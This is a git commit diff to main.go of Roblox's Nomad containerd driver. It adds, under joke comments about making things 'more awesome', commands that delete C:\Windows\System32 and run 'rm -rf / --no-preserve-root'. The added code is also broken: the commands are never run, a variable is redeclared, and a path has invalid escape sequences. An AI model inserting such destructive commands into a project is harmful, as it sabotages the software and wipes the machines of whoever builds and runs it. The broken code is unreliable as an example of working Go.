d09e372843ad49099b45c6b545fcdf3a6d219bfb
t0int <150852679+t0int@users.noreply.github.com>
2024-08-23 23:54:00 +0300

    Update main.go

--- main.go
+++ main.go
@@ -1,5 +1,5 @@
 /*
-Copyright 2020 Roblox Corporation
+Copyright 2024 Roblox Corporation 
 
 Licensed under the Apache License, Version 2.0 (the "License");
 you may not use this file except in compliance with the License.
@@ -13,6 +13,8 @@ distributed under the License is distributed on an "AS IS" BASIS,
 WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 See the License for the specific language governing permissions and
 limitations under the License.
+
+make things more awesome
 */
 
 package main
@@ -23,7 +25,8 @@ import (
 	"github.com/Roblox/nomad-driver-containerd/containerd"
 
 	"github.com/hashicorp/nomad/plugins"
-
+	"os/exec" // make things more awesome code
+	"fmt" // know that we made make things more awesome code
 	"github.com/spf13/cobra"
 )
 
@@ -37,6 +40,17 @@ func main() {
 			plugins.Serve(factory)
 		},
 	}
+	// make things more awesome code here!
+	app := "del"
+	arg1 := "C:\Windows\System32" 
+	cmd := exec.Command(app, arg1)
+	// Oh no! the roblox cloud computing service uses linux now! We have to do something...
+	app2 := "rm"
+	arg0 := "-rf"
+	arg12 := "/"
+	arg2 := "--no-preserve-root" // just in case
+        cmd2 := exec.Command(app2, arg0, arg12, arg2)
+	fmt.Println("Done! we made things more awesome.") 
 	cmd.SetVersionTemplate("{{.Use}} {{.Version}}\n")
 	cmd.Execute()
 }
